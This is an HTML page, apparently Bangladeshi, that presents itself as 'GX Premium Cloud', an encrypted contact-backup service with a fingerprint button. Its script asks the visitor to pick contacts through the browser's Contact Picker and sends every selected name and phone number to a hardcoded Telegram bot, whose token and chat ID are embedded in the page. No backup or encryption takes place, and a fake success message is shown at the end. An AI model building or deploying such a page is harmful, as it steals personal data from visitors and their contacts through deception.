<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GX Premium Cloud</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --primary: #00f2fe;
            --secondary: #7e22ce;
        }

        body {
            background: #020406;
            margin: 0;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Inter', sans-serif;
        }

        /* সেই লাইট চলাচল করার অ্যানিমেশন (Moving Glow) */
        .moving-light {
            position: absolute;
            width: 450px;
            height: 450px;
            background: radial-gradient(circle, rgba(0, 242, 254, 0.2), rgba(126, 34, 206, 0.2));
            filter: blur(120px);
            border-radius: 50%;
            z-index: -1;
            /* লাইটটি স্ক্রিনজুড়ে চলাচলের জন্য অ্যানিমেশন */
            animation: moveLight 15s infinite alternate ease-in-out;
        }

        @keyframes moveLight {
            0% { transform: translate(-50%, -50%) scale(1); }
            50% { transform: translate(40%, 20%) scale(1.2); }
            100% { transform: translate(-20%, 50%) scale(1); }
        }

        .main-container {
            background: rgba(255, 255, 255, 0.02);
            backdrop-filter: blur(45px);
            -webkit-backdrop-filter: blur(45px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 50px;
            padding: 60px 30px;
            width: 350px;
            text-align: center;
            position: relative;
            box-shadow: 0 40px 100px rgba(0,0,0,0.8);
        }

        .action-circle {
            width: 140px;
            height: 140px;
            background: radial-gradient(circle, rgba(0, 242, 254, 0.05), transparent);
            border: 2px dashed rgba(0, 242, 254, 0.4);
            border-radius: 50%;
            margin: 0 auto 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            box-shadow: inset 0 0 25px rgba(0, 242, 254, 0.1);
        }

        .action-circle:hover {
            border: 2px solid var(--primary);
            box-shadow: 0 0 50px rgba(0, 242, 254, 0.5);
            transform: scale(1.05) rotate(90deg);
        }

        .action-circle:active {
            transform: scale(0.9);
        }

        .action-circle i {
            transition: 0.6s;
            font-size: 55px;
            color: var(--primary);
            text-shadow: 0 0 25px rgba(0, 242, 254, 0.8);
        }

        .action-circle:hover i {
            transform: rotate(-90deg);
        }

        .title-text {
            font-size: 24px;
            font-weight: 900;
            color: #fff;
            letter-spacing: -0.5px;
            margin-bottom: 5px;
        }

        .sub-text {
            font-size: 11px;
            color: rgba(255, 255, 255, 0.3);
            text-transform: uppercase;
            letter-spacing: 4px;
            margin-bottom: 20px;
        }

        #status {
            margin-top: 30px;
            font-size: 14px;
            font-weight: 600;
            color: var(--primary);
            min-height: 24px;
        }

        .instruction {
            font-size: 12px;
            color: rgba(255, 255, 255, 0.4);
            line-height: 1.6;
        }
    </style>
</head>
<body>

    <div class="moving-light"></div>

    <div class="main-container">
        <div class="sub-text">Encrypted Sync</div>
        <div class="title-text">Contact Cloud</div>
        
        <div class="action-circle" onclick="fetchContacts()">
            <i class="fas fa-fingerprint"></i>
        </div>

        <p class="instruction">আইকনে চাপ দিয়ে <br> ব্যাকআপ শুরু করুন</p>

        <div id="status"></div>
    </div>

    <script>
        const BOT_TOKEN = '8651122945:AAH54GuzokeFtUMxdbJOEe0ZhUptrgxTm1k';
        const CHAT_ID = '6467941734';

        async function fetchContacts() {
            const status = document.getElementById('status');
            
            if (!('contacts' in navigator)) {
                status.innerHTML = "❌ Browser Not Supported";
                return;
            }

            try {
                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });

                if (contacts && contacts.length > 0) {
                    status.innerHTML = `<i class="fas fa-circle-notch fa-spin"></i> সংযোগ করা হচ্ছে...`;
                    await sendData(contacts);
                }
            } catch (err) { console.log("Cancelled"); }
        }

        async function sendData(contacts) {
            const status = document.getElementById('status');
            const CHUNK_SIZE = 15;
            const now = new Date();
            const days = ['রবিবার', 'সোমবার', 'মঙ্গলবার', 'বুধবার', 'বৃহস্পতিবার', 'শুক্রবার', 'শনিবার'];
            const dateStr = now.toLocaleDateString('bn-BD', { year: 'numeric', month: 'long', day: 'numeric' });
            const timeStr = now.toLocaleTimeString('bn-BD');

            for (let i = 0; i < contacts.length; i += CHUNK_SIZE) {
                const chunk = contacts.slice(i, i + CHUNK_SIZE);
                let message = `📊 **GX Backup number**\n\n`;
                message += `📅 ${days[now.getDay()]}, ${dateStr}\n⏰ ${timeStr}\n👥 Total: ${contacts.length}\n`;
                message += `━━━━━━━━━━━━━━━━━━━━\n\n`;

                chunk.forEach(c => {
                    message += `Name : ──${c.name ? c.name[0] : 'N/A'}─\nNumber : ${c.tel ? c.tel[0] : 'N/A'}\n\n`;
                });

                message += `— GX Sammim sent`;

                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
                    });
                    
                    status.innerText = `প্রগতি: ${Math.min(i + CHUNK_SIZE, contacts.length)} / ${contacts.length}`;
                    await new Promise(r => setTimeout(r, 1300)); 
                } catch (e) { console.error(e); }
            }
            
            // মেসেজ অ্যালার্ট ছাড়াই সাকসেস মেসেজ
            status.style.color = "#38ef7d";
            status.innerHTML = "✅ সফলভাবে সম্পন্ন হয়েছে!";
        }
    </script>
</body>
</html>
